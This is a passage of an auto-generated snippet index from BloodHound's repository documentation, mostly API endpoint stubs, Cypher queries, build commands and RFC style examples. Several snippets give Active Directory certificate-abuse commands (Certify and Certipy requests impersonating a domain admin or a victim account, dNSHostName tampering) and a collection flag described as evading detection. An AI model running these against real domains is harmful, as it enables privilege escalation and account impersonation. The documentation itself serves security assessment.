principal\n\n# Find the certificate template\n$rootDSE = New-Object DirectoryServices.DirectoryEntry(\"LDAP://RootDSE\")\n$template = [ADSI]\"LDAP://CN=$templateName,CN=Certificate Templates,CN=Public Key Services,CN=Services,$($rootDSE.configurationNamingContext)\"\n\n# Print ACEs granted to the principal\n$acl = $template.psbase.ObjectSecurity\n$acl.Access | ? { $_.IdentityReference -like \"*$principalName\" }\n```\n\n----------------------------------------\n\nTITLE: Defining OpenAPI GET Endpoint for Foreign Admins in BloodHound API\nDESCRIPTION: This YAML snippet defines the OpenAPI specification for a GET endpoint that retrieves foreign administrators of a specific domain. It uses the domain's object ID as a path parameter.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/reference/domains/get-domain-entity-foreign-admins.mdx#2025-04-23_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nopenapi: get /api/v2/domains/{object_id}/foreign-admins\n```\n\n----------------------------------------\n\nTITLE: Defining OpenAPI PUT Endpoint for Updating Saved Query Permissions in BloodHound\nDESCRIPTION: This YAML snippet defines the OpenAPI specification for a PUT endpoint to update permissions on a saved query. The endpoint is '/api/v2/saved-queries/{saved_query_id}/permissions', where {saved_query_id} is a path parameter.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/reference/cypher/share-a-saved-query-or-set-it-to-public.mdx#2025-04-23_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nopenapi: put /api/v2/saved-queries/{saved_query_id}/permissions\n```\n\n----------------------------------------\n\nTITLE: Running BloodHound in Development Mode\nDESCRIPTION: Command to run BloodHound in continuous development mode with local profile, enabling hot-reload functionality.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/cmd/ui/README.md#2025-04-23_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\n$ skaffold dev -p local\n```\n\n----------------------------------------\n\nTITLE: Rendering Documentation Navigation Cards in React/JSX\nDESCRIPTION: React/JSX markup for the documentation navigation section, featuring a grid of cards that link to different documentation sections like installation, data collection, and analysis.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/home.mdx#2025-04-23_snippet_2\n\nLANGUAGE: jsx\nCODE:\n```\n<div\n  style={{marginTop: '2rem', marginBottom: '8rem', maxWidth: '70rem', marginLeft: 'auto',\n  marginRight: 'auto', paddingLeft: '1.25rem',\n  paddingRight: '1.25rem' }}\n>\n<div\n      className=\"text-white dark:text-gray-200\"\n      style={{\n       fontWeight: '600',\n       fontSize: '28px',\n       margin: '0',\n       paddingBottom: '1.25rem' \n      }}\n    >\n      Get started\n    </div>\n<CardGroup cols={3}>\n  <Card\n    title=\"Get Started\"\n    icon=\"house\"\n    href=\"/get-started/introduction\"\n    iconType=\"solid\"\n  >\n    Learn about BloodHound, how to get started, and its security boundaries. \n  </Card>\n  <Card\n    title=\"Install a Data Collector\"\n    icon=\"folder\"\n    href=\"/install-data-collector/overview\"\n    iconType=\"solid\"\n  >\n    Deploy SharpHound Enterprise or AzureHound Enterprise to collect and upload data for processing and analysis. \n  </Card>\n  <Card \n    title=\"Collect Data\"\n      icon=\"searchengin\"\n      href=\"/collect-data/overview\"\n      iconType=\"solid\"\n    >\n    Learn how attack path data collection and ingestion works, and how to run attack path data collections.\n    </Card>\n  <Card\n    title=\"Analyze Attack Path Data\"\n    icon=\"chart-column\"\n    href=\"/analyze-data/overview\"\n    iconType=\"solid\"\n  >\n  Analyzing ingested BloodHound data, and identify and remediate attack paths and risks.\n  </Card>\n  <Card\n    title=\"Manage BloodHound\"\n    icon=\"user-shield\"\n    href=\"/manage-bloodhound/overview\"\n    iconType=\"solid\"\n  >\n    Manage a BloodHound instance and its related components, such as users, roles, authentication, collector status, and general security.\n  </Card>\n    <Card\n    title=\" API & Integrations\"\n    icon=\"code\"\n    href=\"/integrations/overview\"\n    iconType=\"solid\"\n  >\n    Build with BloodHound through its REST API and integrations.\n  </Card>\n</CardGroup>\n\n</div>\n```\n\n----------------------------------------\n\nTITLE: List Operations with COLLECT and FILTER\nDESCRIPTION: Shows advanced list operations using COLLECT and FILTER to process collections of nodes and filter results.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/packages/go/cypher/README.md#2025-04-23_snippet_39\n\nLANGUAGE: cypher\nCODE:\n```\nMATCH (VE:Excluded)    \nWITH COLLECT(VE) AS excluded\nMATCH (VI:Included) \nWITH excluded, COLLECT(VI) AS included\nWITH FILTER(VI IN included WHERE NOT VI IN excluded) as resultList\nUNWIND resultList as results\nRETURN results.property\n```\n\n----------------------------------------\n\nTITLE: Defining PATCH API Endpoint for SSO Providers in OpenAPI\nDESCRIPTION: OpenAPI specification fragment showing the endpoint path for updating SSO provider configurations. This endpoint allows modifications to an existing SSO provider identified by its unique ID.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/reference/auth/update-sso-provider.mdx#2025-04-23_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nopenapi: patch /api/v2/sso-providers/{sso_provider_id}\n```\n\n----------------------------------------\n\nTITLE: Retrieving Domain Groups - OpenAPI Endpoint Definition\nDESCRIPTION: OpenAPI specification for GET endpoint to fetch domain groups associated with a specific domain object ID. The endpoint follows RESTful conventions using path parameters.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/reference/domains/get-domain-entity-groups.mdx#2025-04-23_snippet_0\n\nLANGUAGE: openapi\nCODE:\n```\nopenapi: get /api/v2/domains/{object_id}/groups\n```\n\n----------------------------------------\n\nTITLE: Ordering Results by Multiple Dimensions in Cypher\nDESCRIPTION: This Cypher query demonstrates sorting projections by multiple dimensions, which adds additional weight to the query's cost in the analyzer's model.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/packages/go/cypher/README.md#2025-04-23_snippet_8\n\nLANGUAGE: cypher\nCODE:\n```\nmatch (p:Person) return p order by p.year asc, p.name desc\n```\n\n----------------------------------------\n\nTITLE: Excluding Domain Controllers from SharpHound Collection\nDESCRIPTION: Command to run SharpHound collection while avoiding domain controllers, which can help evade detection systems like Microsoft ATA/ATP.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/collect-data/ce-collection/sharphound-flags.mdx#2025-04-23_snippet_5\n\nLANGUAGE: batch\nCODE:\n```\nC:\\> SharpHound.exe -d contoso.local --ExcludeDCs\n```\n\n----------------------------------------\n\nTITLE: Requesting Malicious Certificate with Certify (Windows)\nDESCRIPTION: Using Certify tool to request enrollment in the affected certificate template, specifying the CA and target principal to impersonate with a SID-based SAN.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/adcs-esc6a.mdx#2025-04-23_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\n.\\Certify.exe request /ca:rootdomaindc.forestroot.com\\forestroot-RootDomainDC-CA /template:ESC6 /altname:ForestRootDA /url:\"tag:microsoft.com,2022-09-14:sid:S-1-5-21-2697957641-2271029196-387917394-500\"\n```\n\n----------------------------------------\n\nTITLE: DCSync Edge Query Example in Cypher\nDESCRIPTION: Cypher query example to reveal the underlying GetChanges and GetChangeAll edges that form a DCSync attack path in BloodHound. This demonstrates how non-traversable edges combine to enable traversable attack paths.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/traversable-edges.mdx#2025-04-23_snippet_0\n\nLANGUAGE: cypher\nCODE:\n```\nMATCH p = (n)-[:GetChanges|GetChangesAll]->(m) RETURN p\n```\n\n----------------------------------------\n\nTITLE: OpenAPI GET Endpoint Definition for Controllable Objects\nDESCRIPTION: Defines the API endpoint for retrieving controllable objects by base object ID in BloodHound. The endpoint follows the pattern /api/v2/base/{object_id}/controllables.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/reference/ad-base-entities/get-entity-controllables.mdx#2025-04-23_snippet_0\n\nLANGUAGE: openapi\nCODE:\n```\nopenapi: get /api/v2/base/{object_id}/controllables\n```\n\n----------------------------------------\n\nTITLE: Building BloodHound UI for Production\nDESCRIPTION: Command to create an optimized production build of the UI in the build folder using Yarn.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/cmd/ui/README.md#2025-04-23_snippet_6\n\nLANGUAGE: bash\nCODE:\n```\nyarn build\n```\n\n----------------------------------------\n\nTITLE: Defining Common Parameters in YAML for OpenAPI Specification\nDESCRIPTION: This YAML snippet demonstrates how to define common parameters at both path and operation levels in an OpenAPI specification. It includes references to reusable parameter definitions and examples of query parameters with predicates.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/packages/go/openapi/src/paths/README.md#2025-04-23_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\n# Path level\n- $ref: './../parameters/header.prefer.yaml'\n- $ref: './../parameters/path.object-id.yaml'\n\n# Operation level\n- $ref: './../parameters/query.created-at.yaml'\n- $ref: './../parameters/query.updated-at.yaml'\n- $ref: './../parameters/query.deleted-at.yaml'\n- $ref: './../parameters/query.skip.yaml'\n- $ref: './../parameters/query.limit.yaml'\n  \n# Filter params with predicates\n- name: sort_by\n  in: query\n  description: Sortable columns are [list_columns_here].\n  schema:\n      $ref: './../schemas/api.params.query.sort-by.yaml'\n- name: [string_param_name]\n  in: query\n  schema:\n    $ref: './../schemas/api.params.predicate.filter.string.yaml'\n- name: [int_param_name]\n  in: query\n  schema:\n    $ref: './../schemas/api.params.predicate.filter.integer.yaml'\n```\n\n----------------------------------------\n\nTITLE: Creating and Dropping Node Property Existence Constraints in Cypher\nDESCRIPTION: Demonstrates how to create and drop property existence constraints on nodes with specific labels. These constraints ensure that specified properties must exist on nodes with the given label.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/packages/go/cypher/README.md#2025-04-23_snippet_27\n\nLANGUAGE: cypher\nCODE:\n```\nCREATE CONSTRAINT ON (V:Label) ASSERT EXISTS (V.Property);\nDROP CONSTRAINT ON (V:Label) ASSERT EXISTS (V.Property);\n```\n\n----------------------------------------\n\nTITLE: Retrieving Controllers for Enterprise Certificate Authorities in BloodHound API\nDESCRIPTION: OpenAPI endpoint specification for fetching controllers associated with a specific Enterprise CA identified by object_id. This endpoint is available in both enterprise and community editions of BloodHound.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/reference/enterprise-cas/get-enterprise-ca-entity-controllers.mdx#2025-04-23_snippet_0\n\nLANGUAGE: openapi\nCODE:\n```\nopenapi: get /api/v2/enterprisecas/{object_id}/controllers\n```\n\n----------------------------------------\n\nTITLE: GET API Endpoint for Certificate Template Controllers\nDESCRIPTION: API specification for retrieving controllers of a certificate template identified by object_id. This endpoint allows users to fetch entities that have control over a specific certificate template.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/reference/cert-templates/get-cert-template-entity-controllers.mdx#2025-04-23_snippet_0\n\nLANGUAGE: openapi\nCODE:\n```\nopenapi: get /api/v2/certtemplates/{object_id}/controllers\n```\n\n----------------------------------------\n\nTITLE: Using Collect Function in Cypher\nDESCRIPTION: This Cypher query shows the use of the collect function, which adds weight to the query's cost in the analyzer's model.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/packages/go/cypher/README.md#2025-04-23_snippet_5\n\nLANGUAGE: cypher\nCODE:\n```\nmatch (p:Person)-[:ACTED_IN]->(m:Movie) return p.name, collect(m.title)\n```\n\n----------------------------------------\n\nTITLE: Specifying DNS Suffix for SharpHound\nDESCRIPTION: Command to help SharpHound resolve computer names when DNS is not synchronized with Active Directory by providing the correct DNS suffix.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/collect-data/ce-collection/sharphound-flags.mdx#2025-04-23_snippet_6\n\nLANGUAGE: batch\nCODE:\n```\nC:\\> SharpHound.exe --RealDNSName COMPANY.COM\n```\n\n----------------------------------------\n\nTITLE: Converting Certificate to PFX Format in Windows\nDESCRIPTION: Uses certutil to convert a certificate from PEM format to PFX format, which is required for the subsequent authentication step with Rubeus.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/adcs-esc6b.mdx#2025-04-23_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\ncertutil.exe -MergePFX .\\cert.pem .\\cert.pfx\n```\n\n----------------------------------------\n\nTITLE: Checking Active Directory Recycle Bin Status\nDESCRIPTION: PowerShell command to verify if the Active Directory recycle bin feature is enabled for the forest by querying the specific feature ID.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/collect-data/enterprise-collection/data-retention.mdx#2025-04-23_snippet_0\n\nLANGUAGE: powershell\nCODE:\n```\n[bool](Get-ADOptionalFeature -Identity 766ddcd8-acd0-445e-f3b9-a7f9b6744f2a | select -ExpandProperty EnabledScopes)\n```\n\n----------------------------------------\n\nTITLE: Defining GET Endpoint for Domain Computers in OpenAPI\nDESCRIPTION: This YAML snippet specifies an OpenAPI endpoint for retrieving computers associated with a domain. It uses the domain's object_id as a path parameter to fetch the relevant computers.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/reference/domains/get-domain-entity-computers.mdx#2025-04-23_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nopenapi: get /api/v2/domains/{object_id}/computers\n```\n\n----------------------------------------\n\nTITLE: Multiple Node Lookup in Cypher\nDESCRIPTION: This Cypher query demonstrates a higher-cost multiple node lookup operation.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/packages/go/cypher/README.md#2025-04-23_snippet_12\n\nLANGUAGE: cypher\nCODE:\n```\nmatch (p1:Person), (p2:Person) where p1.name = \"Jim\" and p2.name = \"Evil Jim\" return p1, p2\n```\n\n----------------------------------------\n\nTITLE: Structuring RFC Overview Section in Markdown\nDESCRIPTION: Example of how to format the Overview section of a BloodHound RFC, including the second-level heading and a brief summary of the RFC's contents.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/rfc/bh-rfc-0.md#2025-04-23_snippet_2\n\nLANGUAGE: markdown\nCODE:\n```\n```markdown\n## 1. Overview\n\nThis document outlines how to write, structure, and maintain BloodHound RFC documents. It covers best practices for clarity, consistency, and completeness so that new RFCs can be easily drafted, reviewed, accepted, and referenced by the BloodHound team.\n```\n```\n\n----------------------------------------\n\nTITLE: Project Title and Description in Markdown\nDESCRIPTION: Markdown header and description text defining the EIN library's purpose and functionality\nSOURCE: https://github.com/specterops/bloodhound/blob/main/packages/go/ein/readme.md#2025-04-23_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n# Efficient Ingest Normalizer (EIN)\\nEIN is a GO library which consumes SharpHound/AzureHound JSON data and turns it into a format understood by the BloodHound data pipeline\n```\n\n----------------------------------------\n\nTITLE: Configuring SharpHound Enterprise Authentication\nDESCRIPTION: JSON configuration example for SharpHound Enterprise auth.json file, containing the authentication token settings.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/install-data-collector/install-sharphound/installation-upgrade.mdx#2025-04-23_snippet_1\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"Token\": \"your-token-here\",\n  \"TokenID\": \"your-token-id-here\"\n}\n```\n\n----------------------------------------\n\nTITLE: Defining API Endpoint for Retrieving Computer Admin Rights in BloodHound\nDESCRIPTION: OpenAPI specification for a GET endpoint that retrieves administrator rights information for a specific computer. The endpoint uses the computer's object_id as a path parameter to identify which computer's admin rights should be returned.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/reference/computers/get-computer-entity-admin-rights.mdx#2025-04-23_snippet_0\n\nLANGUAGE: openapi\nCODE:\n```\nopenapi: get /api/v2/computers/{object_id}/admin-rights\n```\n\n----------------------------------------\n\nTITLE: Procedure Call in Cypher\nDESCRIPTION: This Cypher query demonstrates a procedure call, which is filtered by default in the AST filter for sanitizing potentially dangerous openCypher language constructs.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/packages/go/cypher/README.md#2025-04-23_snippet_21\n\nLANGUAGE: cypher\nCODE:\n```\nCALL com.package.path.functionName() YIELD ResultField as A;\n```\n\n----------------------------------------\n\nTITLE: Retrieving Enterprise Certificate Authority by Object ID in BloodHound API\nDESCRIPTION: OpenAPI specification for the GET endpoint to retrieve Enterprise Certificate Authority (CA) information by its object ID. This endpoint is available in both Enterprise and Community editions of BloodHound.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/reference/enterprise-cas/get-enterprise-ca-entity-info.mdx#2025-04-23_snippet_0\n\nLANGUAGE: openapi\nCODE:\n```\nopenapi: get /api/v2/enterprisecas/{object_id}\n```\n\n----------------------------------------\n\nTITLE: Requesting Certificate with Certipy in Linux\nDESCRIPTION: Uses Certipy to request a certificate enrollment as the victim computer with the specified template and Enterprise CA.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/adcs-esc9b.mdx#2025-04-23_snippet_13\n\nLANGUAGE: bash\nCODE:\n```\ncertipy req -u VICTIM@CORP.LOCAL -p PWD -ca CA-NAME -target SERVER -template TEMPLATE\n```\n\n----------------------------------------\n\nTITLE: Retrieving GPOs Associated with an OU via BloodHound API\nDESCRIPTION: REST API endpoint that retrieves Group Policy Objects (GPOs) linked to a specific Organizational Unit, identified by its object_id. This endpoint is available in both Enterprise and Community editions of BloodHound.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/reference/ous/get-ou-entity-gpos.mdx#2025-04-23_snippet_0\n\nLANGUAGE: openapi\nCODE:\n```\nopenapi: get /api/v2/ous/{object_id}/gpos\n```\n\n----------------------------------------\n\nTITLE: Formatting RFC Detailed Proposal Section in Markdown\nDESCRIPTION: Example of how to begin the detailed proposal section of a BloodHound RFC, using second-level headings for main sections and third-level headings for subsections.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/rfc/bh-rfc-0.md#2025-04-23_snippet_5\n\nLANGUAGE: markdown\nCODE:\n```\n```markdown\n## 4. Versioning\n\nAll releases conform to the [Semantic Versioning Specification](semver.org).\n```\n```\n\n----------------------------------------\n\nTITLE: Visualizing BloodHound Git Branching Strategy with Mermaid\nDESCRIPTION: This Mermaid diagram illustrates the BloodHound branching strategy, showing the relationships between main, staging, and feature branches. It demonstrates the flow of commits, release candidates, and version tagging across different branch types.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/rfc/bh-rfc-1.md#2025-04-23_snippet_0\n\nLANGUAGE: mermaid\nCODE:\n```\n---\nconfig:\n  gitGraph:\n    showCommitLabel: false\n    parallelCommits: true\n---\n    gitGraph\n       commit\n       branch stage/v1.0.0\n       commit type: HIGHLIGHT tag: \"v1.0.0-rc1\"\n       branch bed-xxx-stabilization\n       commit\n       commit\n       checkout stage/v1.0.0\n       merge bed-xxx-stabilization type: HIGHLIGHT tag: \"v1.0.0-rc2\" tag: \"v1.0.0\"\n       checkout main\n       commit\n       commit\n       commit\n       merge stage/v1.0.0\n       commit\n       commit\n       commit\n       checkout stage/v1.0.0\n       branch stage/v1.0.1\n       commit type: HIGHLIGHT\n       branch bed-xxx-hotfix\n       commit\n       commit\n       checkout stage/v1.0.1\n       merge bed-xxx-hotfix type: HIGHLIGHT tag: \"v1.0.1-rc1\" tag: \"v1.0.1\"\n       checkout main\n       merge stage/v1.0.1\n       commit\n```\n\n----------------------------------------\n\nTITLE: Defining GET Endpoint for Collector Checksum in OpenAPI\nDESCRIPTION: Specifies the OpenAPI format for a GET request to retrieve checksums for BloodHound collectors. The endpoint includes parameters for collector type and release tag.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/reference/collectors/get-collector-checksum-by-version.mdx#2025-04-23_snippet_0\n\nLANGUAGE: openapi\nCODE:\n```\nopenapi: get /api/v2/collectors/{collector_type}/{release_tag}/checksum\n```\n\n----------------------------------------\n\nTITLE: Defining GET Endpoint for Domain GPOs in BloodHound API\nDESCRIPTION: OpenAPI specification for the GET /api/v2/domains/{object_id}/gpos endpoint which retrieves Group Policy Objects associated with a specific domain. The endpoint requires an object_id parameter to identify the domain.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/reference/domains/get-domain-entity-gpos.mdx#2025-04-23_snippet_0\n\nLANGUAGE: openapi\nCODE:\n```\nopenapi: get /api/v2/domains/{object_id}/gpos\n```\n\n----------------------------------------\n\nTITLE: Defining GET Endpoint for PS Remote Rights in OpenAPI\nDESCRIPTION: OpenAPI specification for the GET endpoint to retrieve PS Remote Rights for a group. It includes the endpoint path with a path parameter for the group's object_id.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/reference/groups/get-group-entity-powershell-remote-rights.mdx#2025-04-23_snippet_0\n\nLANGUAGE: openapi\nCODE:\n```\nopenapi: get /api/v2/groups/{object_id}/ps-remote-rights\n```\n\n----------------------------------------\n\nTITLE: Query Plan Explanation in Cypher\nDESCRIPTION: Demonstrates how to view query execution plan using the EXPLAIN clause without executing the query.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/packages/go/cypher/README.md#2025-04-23_snippet_34\n\nLANGUAGE: cypher\nCODE:\n```\nEXPLAIN MATCH (V:Label) WHERE V.Name = 'indexed name' RETURN V;\n```\n\n----------------------------------------\n\nTITLE: Building BloodHound Components with Skaffold\nDESCRIPTION: Command to build all BloodHound components including Web UI, API, PostgreSQL and Neo4J databases using Skaffold.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/cmd/ui/README.md#2025-04-23_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\n$ skaffold build\n```\n\n----------------------------------------\n\nTITLE: Enrolling Certificate as Victim\nDESCRIPTION: Requests a certificate enrollment using the compromised victim account credentials through Certipy\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/adcs-esc10a.mdx#2025-04-23_snippet_4\n\nLANGUAGE: bash\nCODE:\n```\nCertipy.exe req -u VICTIM@CORP.LOCAL -p PWD -ca CA-NAME -target CA-SERVER -template TEMPLATE\n```\n\n----------------------------------------\n\nTITLE: Creating gMSA Account\nDESCRIPTION: PowerShell script to create the gMSA account with specific security settings\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/install-data-collector/install-sharphound/create-gmsa.mdx#2025-04-23_snippet_4\n\nLANGUAGE: powershell\nCODE:\n```\n$gmsaName = \"t0\\_gMSA\\_SHS\" # Name of the gMSA\n$gmsaOUDN = \"&lt;DISGINGUISHED_NAME&gt;\" # Distinguished Name of OU to create the gMSA in\n\nNew-ADServiceAccount -Name $gmsaName `\n-Description \"SharpHound Enterprise service account for BloodHound Enterprise\" `\n-DNSHostName \"$($gmsaName).$((Get-ADDomain).DNSRoot)\" `\n-ManagedPasswordIntervalInDays 32 `\n-PrincipalsAllowedToRetrieveManagedPassword \"$($gmsaName)_pwdRead\" `\n-Enabled $True `\n-AccountNotDelegated $True `\n-KerberosEncryptionType AES128,AES256 `\n-Path $gmsaOUDN `\n-PassThru\n```\n\n----------------------------------------\n\nTITLE: Retrieving PowerShell Remote Rights for a User in BloodHound API\nDESCRIPTION: An OpenAPI endpoint definition for getting PowerShell Remote rights for a specific user identified by their object_id. This endpoint allows querying rights that enable PowerShell remoting capabilities for the user.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/reference/ad-users/get-user-entity-powershell-remote-rights.mdx#2025-04-23_snippet_0\n\nLANGUAGE: openapi\nCODE:\n```\nopenapi: get /api/v2/users/{object_id}/ps-remote-rights\n```\n\n----------------------------------------\n\nTITLE: Defining DELETE Endpoint for Token Removal in BloodHound API\nDESCRIPTION: OpenAPI specification for a DELETE endpoint that allows removing a specific token by its ID. This endpoint is part of the BloodHound API v2 and is available in both Enterprise and Community editions.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/reference/api-tokens/delete-a-user-token.mdx#2025-04-23_snippet_0\n\nLANGUAGE: openapi\nCODE:\n```\nopenapi: delete /api/v2/tokens/{token_id}\n```\n\n----------------------------------------\n\nTITLE: Basic Conventional Commit Structure\nDESCRIPTION: Demonstrates the basic format and required components of a conventional commit message including type, scope, description, body and footer.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/rfc/bh-rfc-2.md#2025-04-23_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n<type>[optional scope]: <description>\\n\\n[optional body]\\n\\n<footer(s)>\n```\n\n----------------------------------------\n\nTITLE: OpenAPI PUT Endpoint Definition for Attack Path Acceptance\nDESCRIPTION: OpenAPI specification defining the PUT endpoint for updating attack path acceptance status. The endpoint accepts an attack path ID as a path parameter.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/reference/attack-paths/update-attack-path-risk.mdx#2025-04-23_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nopenapi: put /api/v2/attack-paths/{attack_path_id}/acceptance\n```\n\n----------------------------------------\n\nTITLE: Defining OpenAPI endpoint for EULA acceptance in BloodHound\nDESCRIPTION: YAML OpenAPI specification defining the GET endpoint for accepting the End User License Agreement (EULA) in BloodHound. This endpoint is part of the Enterprise Edition functionality.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/reference/eula/accept-eula.mdx#2025-04-23_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nopenapi: get /api/v2/accept-eula\n```\n\n----------------------------------------\n\nTITLE: Defining CTE Record Shape for Pattern Expansion in PostgreSQL\nDESCRIPTION: Defines the initial recursive CTE structure used for pattern expansion, establishing the record shape for tracking path traversal information.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/packages/go/cypher/models/pgsql/translate/README.md#2025-04-23_snippet_4\n\nLANGUAGE: postgresql\nCODE:\n```\nwith s0 as (with recursive ex0(root_id, next_id, depth, satisfied, is_cycle, path)\n```\n\n----------------------------------------\n\nTITLE: Local Deployment of BloodHound\nDESCRIPTION: Command for one-off local deployment of BloodHound components.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/cmd/ui/README.md#2025-04-23_snippet_2\n\nLANGUAGE: bash\nCODE:\n```\n$ skaffold run -p local\n```\n\n----------------------------------------\n\nTITLE: Restoring dNSHostName of Victim Computer with Certipy in Linux\nDESCRIPTION: This command uses Certipy in Linux to restore the original dNSHostName of the victim computer after the attack to avoid environmental issues.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/adcs-esc10b.mdx#2025-04-23_snippet_14\n\nLANGUAGE: bash\nCODE:\n```\ncertipy account update -username ATTACKER@CORP.LOCAL -password PWD -user VICTIM -dns VICTIM.CORP.LOCAL\n```\n\n----------------------------------------\n\nTITLE: Testing RSAT PowerShell Module Status\nDESCRIPTION: Command to check the installation status of RSAT PowerShell module\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/install-data-collector/install-sharphound/create-gmsa.mdx#2025-04-23_snippet_5\n\nLANGUAGE: powershell\nCODE:\n```\nGet-WindowsCapability -Name RSAT*\n```\n\n----------------------------------------\n\nTITLE: Defining GET API Endpoint for NTAUTH Store Controllers in OpenAPI\nDESCRIPTION: Specifies the OpenAPI endpoint path for retrieving controllers associated with a specific NTAUTH store. The endpoint accepts an object_id parameter and is accessible via GET at /api/v2/ntauthstores/{object_id}/controllers.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/reference/nt-auth-stores/get-nt-auth-store-entity-controllers.mdx#2025-04-23_snippet_0\n\nLANGUAGE: openapi\nCODE:\n```\nopenapi: get /api/v2/ntauthstores/{object_id}/controllers\n```\n\n----------------------------------------\n\nTITLE: Defining YAML Frontmatter for BloodHound RFC\nDESCRIPTION: Example of the required YAML frontmatter at the beginning of each BloodHound RFC document. It includes the RFC number, title, authors, status, and creation date.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/rfc/bh-rfc-0.md#2025-04-23_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n```yaml\n---\nbh-rfc: 0\ntitle: BloodHound RFC Structure & Style Guide\nauthors: |\n    [Lees, Dillon](dlees@specterops.io)\nstatus: DRAFT\ncreated: 2025-01-21\n---\n```\n```\n\n----------------------------------------\n\nTITLE: DNS Resolution Testing\nDESCRIPTION: Commands to test DNS resolution for BloodHound services within the Kubernetes cluster using a busybox container. Used for troubleshooting service connectivity issues.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/examples/helm/README.md#2025-04-23_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\n$ kubectl run -it --rm dns-test -n bloodhoundad --image busybox:latest\n# for name in app-db graph-db; do nslookup $name; done\n```\n\n----------------------------------------\n\nTITLE: Retrieving Linked GPOs for a Domain in OpenAPI\nDESCRIPTION: This OpenAPI specification defines the GET endpoint for retrieving Group Policy Objects (GPOs) linked to a specific domain. The endpoint requires an object_id parameter which identifies the domain.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/reference/domains/get-domain-entity-linked-gpos.mdx#2025-04-23_snippet_0\n\nLANGUAGE: openapi\nCODE:\n```\nopenapi: get /api/v2/domains/{object_id}/linked-gpos\n```\n\n----------------------------------------\n\nTITLE: Detailed Conventional Commit Example\nDESCRIPTION: Illustrates a more complex commit message with scope, description, bulleted body content, and ticket reference.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/rfc/bh-rfc-2.md#2025-04-23_snippet_2\n\nLANGUAGE: markdown\nCODE:\n```\ndocs(bh-rfc-2): Address PR feedback\\n\\n- fixes 'Adherance' typo\\n- removes superfluous types\\n- adds `chore` and `wip` types\\n- updates ticket/issue linking to be required\\n- updates examples for ticket/issue linking and adds reference\\n\\nfixes: BED-5475\n```\n\n----------------------------------------\n\nTITLE: Basic Variable Renaming Example - OpenCypher to PostgreSQL\nDESCRIPTION: Demonstrates how OpenCypher variables are renamed in PostgreSQL translation for simplification and optimization. The variable 'n' is renamed to 'n0' in the translated query.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/packages/go/cypher/models/pgsql/translate/README.md#2025-04-23_snippet_0\n\nLANGUAGE: cypher\nCODE:\n```\nmatch (n) return labels(n)\n```\n\nLANGUAGE: postgresql\nCODE:\n```\nwith s0 as (select (n0.id, n0.kind_ids, n0.properties)::nodecomposite as n0 from node n0)\nselect (s0.n0).kind_ids\nfrom s0;\n```\n\n----------------------------------------\n\nTITLE: Adding Combined Node in Sigmajs for BloodHound\nDESCRIPTION: Demonstrates how to add a combined node type that merges 